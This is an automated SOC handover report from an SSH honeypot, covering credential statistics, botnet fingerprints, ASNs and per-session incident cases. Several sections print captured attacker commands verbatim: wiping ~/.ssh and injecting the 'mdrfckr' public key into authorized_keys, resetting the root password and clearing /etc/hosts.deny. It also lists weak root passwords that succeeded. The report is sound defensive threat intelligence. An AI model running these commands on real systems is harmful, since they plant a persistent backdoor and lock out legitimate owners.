# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-03 |
| **Generated At** | 2026-04-03T20:34:38Z |
| **Shift Time** | 20:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **108** |
| Confirmed Threats | **104** |
| False Positives Filtered | **4** (3.7%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **18** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **87** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **66** |
| Unique Credential Pairs | **38** |
| Unique Usernames | **26** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `345gs5662d34` | 10 |
| `guest` | 3 |
| `blank` | 2 |
| `bot` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `Bot8` | 2 |
| `1q2w3e` | 2 |
| `AAbb12345` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `bot` | `Bot8` | 2 |
| `root` | `AAbb12345` | 2 |
| `max` | `12345` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWERTYUIO12` | `101.52.130.122` | 2026-04-03T19:37:48 |
| `root` | `AAbb12345` | `118.193.34.157` | 2026-04-03T19:50:43 |
| `root` | `3245gs5662d34` | `118.193.34.157` | 2026-04-03T19:50:46 |
| `root` | `qwe_1234` | `118.193.34.157` | 2026-04-03T19:53:02 |
| `root` | `Qwe123!` | `118.193.34.157` | 2026-04-03T20:02:04 |
| `root` | `Qwe123!` | `186.251.71.202` | 2026-04-03T20:11:22 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-04-03T20:11:30 |
| `root` | `QWERTYUIOP2024` | `118.193.34.157` | 2026-04-03T20:13:16 |
| `root` | `AAbb12345` | `186.251.71.202` | 2026-04-03T20:15:29 |
| `root` | `A123456789J` | `118.193.34.157` | 2026-04-03T20:15:30 |
| `root` | `Qazwsx1234@123` | `186.251.71.202` | 2026-04-03T20:23:41 |
| `root` | `sftpuser` | `118.193.34.157` | 2026-04-03T20:31:07 |
| `root` | `Qazwsx1234@123` | `118.193.34.157` | 2026-04-03T20:33:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **108** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 56 |
| OpenSSH | 14 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 56 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 14 | 14 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 56 | 5 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 14 | 14 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:XoRQZSHUtSYb"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.52.130.122`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.193.34.157`, `186.251.71.202`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **25** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS15802` | Emirates Integrated Telecommunications Company PJSC | 2 | HIGH |
| `AS212512` | Detai Prosperous Technologies Limited | 1 | LOW |
| `AS55990` | Huawei Cloud Service data center | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-63d01cfbebbc

| Field | Detail |
|---|---|
| **Source IP** | `101.52.130[.]122` |
| **First Seen** | 2026-04-03 19:37 |
| **Last Seen** | 2026-04-03 19:38 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XoRQZSHUtSYb"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 19:37:47` | `cowrie.session.connect` |
| `2026-04-03 19:37:47` | `cowrie.client.version` |
| `2026-04-03 19:37:47` | `cowrie.client.kex` |
| `2026-04-03 19:37:48` | `cowrie.login.success` |
| `2026-04-03 19:37:48` | `cowrie.session.params` |
| `2026-04-03 19:37:48` | `cowrie.command.input` |
| `2026-04-03 19:37:48` | `cowrie.command.failed` |
| `2026-04-03 19:37:48` | `cowrie.log.closed` |
| `2026-04-03 19:37:49` | `cowrie.session.params` |
| `2026-04-03 19:37:49` | `cowrie.command.input` |
| `2026-04-03 19:37:49` | `cowrie.session.file_download` |
| `2026-04-03 19:37:49` | `cowrie.log.closed` |
| `2026-04-03 19:38:06` | `cowrie.session.params` |
| `2026-04-03 19:38:06` | `cowrie.command.input` |
| `2026-04-03 19:38:06` | `cowrie.log.closed` |
| `2026-04-03 19:38:07` | `cowrie.session.params` |
| `2026-04-03 19:38:07` | `cowrie.command.input` |
| `2026-04-03 19:38:07` | `cowrie.log.closed` |
| `2026-04-03 19:38:07` | `cowrie.session.params` |
| `2026-04-03 19:38:07` | `cowrie.command.input` |
| `2026-04-03 19:38:07` | `cowrie.session.file_download` |
| `2026-04-03 19:38:07` | `cowrie.log.closed` |
| `2026-04-03 19:38:08` | `cowrie.session.params` |
| `2026-04-03 19:38:08` | `cowrie.command.input` |
| `2026-04-03 19:38:08` | `cowrie.log.closed` |
| `2026-04-03 19:38:08` | `cowrie.session.params` |
| `2026-04-03 19:38:08` | `cowrie.command.input` |
| `2026-04-03 19:38:08` | `cowrie.log.closed` |
| `2026-04-03 19:38:08` | `cowrie.session.params` |
| `2026-04-03 19:38:08` | `cowrie.command.input` |
| `2026-04-03 19:38:08` | `cowrie.command.input` |
| `2026-04-03 19:38:09` | `cowrie.log.closed` |
| `2026-04-03 19:38:09` | `cowrie.session.params` |
| `2026-04-03 19:38:09` | `cowrie.command.input` |
| `2026-04-03 19:38:09` | `cowrie.log.closed` |
| `2026-04-03 19:38:09` | `cowrie.session.params` |
| `2026-04-03 19:38:09` | `cowrie.command.input` |
| `2026-04-03 19:38:09` | `cowrie.log.closed` |
| `2026-04-03 19:38:10` | `cowrie.session.params` |
| `2026-04-03 19:38:10` | `cowrie.command.input` |
| `2026-04-03 19:38:10` | `cowrie.log.closed` |
| `2026-04-03 19:38:10` | `cowrie.session.params` |
| `2026-04-03 19:38:10` | `cowrie.command.input` |
| `2026-04-03 19:38:10` | `cowrie.log.closed` |
| `2026-04-03 19:38:11` | `cowrie.session.params` |
| `2026-04-03 19:38:11` | `cowrie.command.input` |
| `2026-04-03 19:38:11` | `cowrie.log.closed` |
| `2026-04-03 19:38:11` | `cowrie.session.params` |
| `2026-04-03 19:38:11` | `cowrie.command.input` |
| `2026-04-03 19:38:11` | `cowrie.log.closed` |
| `2026-04-03 19:38:12` | `cowrie.session.params` |
| `2026-04-03 19:38:12` | `cowrie.command.input` |
| `2026-04-03 19:38:12` | `cowrie.log.closed` |
| `2026-04-03 19:38:12` | `cowrie.session.params` |
| `2026-04-03 19:38:12` | `cowrie.command.input` |
| `2026-04-03 19:38:12` | `cowrie.log.closed` |
| `2026-04-03 19:38:13` | `cowrie.session.params` |
| `2026-04-03 19:38:13` | `cowrie.command.input` |
| `2026-04-03 19:38:13` | `cowrie.log.closed` |
| `2026-04-03 19:38:13` | `cowrie.session.params` |
| `2026-04-03 19:38:13` | `cowrie.command.input` |
| `2026-04-03 19:38:13` | `cowrie.log.closed` |
| `2026-04-03 19:38:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.52.130[.]122` to AbuseIPDB if not already reported
- [ ] Block `101.52.130[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5b1767963c0

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 19:50 |
| **Last Seen** | 2026-04-03 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 19:50:42` | `cowrie.session.connect` |
| `2026-04-03 19:50:42` | `cowrie.client.version` |
| `2026-04-03 19:50:42` | `cowrie.client.kex` |
| `2026-04-03 19:50:43` | `cowrie.login.success` |
| `2026-04-03 19:50:43` | `cowrie.session.params` |
| `2026-04-03 19:50:43` | `cowrie.command.input` |
| `2026-04-03 19:50:43` | `cowrie.command.failed` |
| `2026-04-03 19:50:43` | `cowrie.log.closed` |
| `2026-04-03 19:50:43` | `cowrie.session.params` |
| `2026-04-03 19:50:43` | `cowrie.command.input` |
| `2026-04-03 19:50:44` | `cowrie.session.file_download` |
| `2026-04-03 19:50:44` | `cowrie.log.closed` |
| `2026-04-03 19:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469f8e1f6ccc

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 19:50 |
| **Last Seen** | 2026-04-03 19:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 19:50:45` | `cowrie.session.connect` |
| `2026-04-03 19:50:45` | `cowrie.client.version` |
| `2026-04-03 19:50:45` | `cowrie.client.kex` |
| `2026-04-03 19:50:46` | `cowrie.login.success` |
| `2026-04-03 19:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31f1c03f572

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 19:53 |
| **Last Seen** | 2026-04-03 19:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 19:53:01` | `cowrie.session.connect` |
| `2026-04-03 19:53:01` | `cowrie.client.version` |
| `2026-04-03 19:53:01` | `cowrie.client.kex` |
| `2026-04-03 19:53:02` | `cowrie.login.success` |
| `2026-04-03 19:53:02` | `cowrie.session.params` |
| `2026-04-03 19:53:02` | `cowrie.command.input` |
| `2026-04-03 19:53:02` | `cowrie.command.failed` |
| `2026-04-03 19:53:02` | `cowrie.log.closed` |
| `2026-04-03 19:53:02` | `cowrie.session.params` |
| `2026-04-03 19:53:02` | `cowrie.command.input` |
| `2026-04-03 19:53:02` | `cowrie.session.file_download` |
| `2026-04-03 19:53:02` | `cowrie.log.closed` |
| `2026-04-03 19:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4cfc1f438f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 19:53 |
| **Last Seen** | 2026-04-03 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 19:53:04` | `cowrie.session.connect` |
| `2026-04-03 19:53:04` | `cowrie.client.version` |
| `2026-04-03 19:53:04` | `cowrie.client.kex` |
| `2026-04-03 19:53:05` | `cowrie.login.success` |
| `2026-04-03 19:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69356aabd304

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:02 |
| **Last Seen** | 2026-04-03 20:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:02:03` | `cowrie.session.connect` |
| `2026-04-03 20:02:03` | `cowrie.client.version` |
| `2026-04-03 20:02:04` | `cowrie.client.kex` |
| `2026-04-03 20:02:04` | `cowrie.login.success` |
| `2026-04-03 20:02:04` | `cowrie.session.params` |
| `2026-04-03 20:02:04` | `cowrie.command.input` |
| `2026-04-03 20:02:04` | `cowrie.command.failed` |
| `2026-04-03 20:02:04` | `cowrie.log.closed` |
| `2026-04-03 20:02:05` | `cowrie.session.params` |
| `2026-04-03 20:02:05` | `cowrie.command.input` |
| `2026-04-03 20:02:05` | `cowrie.session.file_download` |
| `2026-04-03 20:02:05` | `cowrie.log.closed` |
| `2026-04-03 20:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ee13229255d

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:02 |
| **Last Seen** | 2026-04-03 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:02:06` | `cowrie.session.connect` |
| `2026-04-03 20:02:06` | `cowrie.client.version` |
| `2026-04-03 20:02:07` | `cowrie.client.kex` |
| `2026-04-03 20:02:07` | `cowrie.login.success` |
| `2026-04-03 20:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d66df25e562

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:11 |
| **Last Seen** | 2026-04-03 20:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:11:20` | `cowrie.session.connect` |
| `2026-04-03 20:11:20` | `cowrie.client.version` |
| `2026-04-03 20:11:21` | `cowrie.client.kex` |
| `2026-04-03 20:11:22` | `cowrie.login.success` |
| `2026-04-03 20:11:23` | `cowrie.session.params` |
| `2026-04-03 20:11:23` | `cowrie.command.input` |
| `2026-04-03 20:11:23` | `cowrie.command.failed` |
| `2026-04-03 20:11:23` | `cowrie.log.closed` |
| `2026-04-03 20:11:24` | `cowrie.session.params` |
| `2026-04-03 20:11:24` | `cowrie.command.input` |
| `2026-04-03 20:11:24` | `cowrie.session.file_download` |
| `2026-04-03 20:11:24` | `cowrie.log.closed` |
| `2026-04-03 20:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e587c1fe9529

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:11 |
| **Last Seen** | 2026-04-03 20:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:11:28` | `cowrie.session.connect` |
| `2026-04-03 20:11:28` | `cowrie.client.version` |
| `2026-04-03 20:11:28` | `cowrie.client.kex` |
| `2026-04-03 20:11:30` | `cowrie.login.success` |
| `2026-04-03 20:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b4692d1dd5f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:13 |
| **Last Seen** | 2026-04-03 20:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:13:15` | `cowrie.session.connect` |
| `2026-04-03 20:13:15` | `cowrie.client.version` |
| `2026-04-03 20:13:15` | `cowrie.client.kex` |
| `2026-04-03 20:13:16` | `cowrie.login.success` |
| `2026-04-03 20:13:16` | `cowrie.session.params` |
| `2026-04-03 20:13:16` | `cowrie.command.input` |
| `2026-04-03 20:13:16` | `cowrie.command.failed` |
